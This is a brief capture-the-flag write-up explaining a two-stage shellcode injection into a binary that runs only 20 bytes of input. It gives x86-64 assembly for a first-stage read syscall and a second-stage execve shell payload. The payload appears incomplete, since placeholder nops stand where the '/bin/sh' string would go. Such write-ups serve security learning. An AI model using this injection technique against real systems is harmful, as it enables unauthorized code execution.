## Challange
Inject a shellcode and get read the flag. The read is limited to 20 bytes.
## Solution
The binary executes an arbitrary input code which has the maximum size of 20 bytes. This imply that is not possible to spawn directly a shell.
We can do multistage injection:
1. First stage: 20 bytes are enough for a `read`. If we position the `char *buf` pointer after the `read` assembly injection, we then in the second stage input the shellcode, which will be executed immidiatly after the injection `read` is completed.
    ```assembly
    mov rsi, rax
    add rsi, 0x11
    xor rax, rax
    xor rdi, rdi
    mov dl, 0xff
    xor rax,rax
    syscall
    ```
2. Second stage: when the injected read is performed we input the shellcode, which will be written starting from the 17th byte of the buffer (since the first stage code is 16 byte long).

    ```assembly
    jmp binsh
    back:
    xor rax, rax
    mov al, 0x3b
    pop rdi
    xor rsi, rsi
    xor rdx,rdx
    syscall

    binsh:
    call back
    nop
    nop
    ```
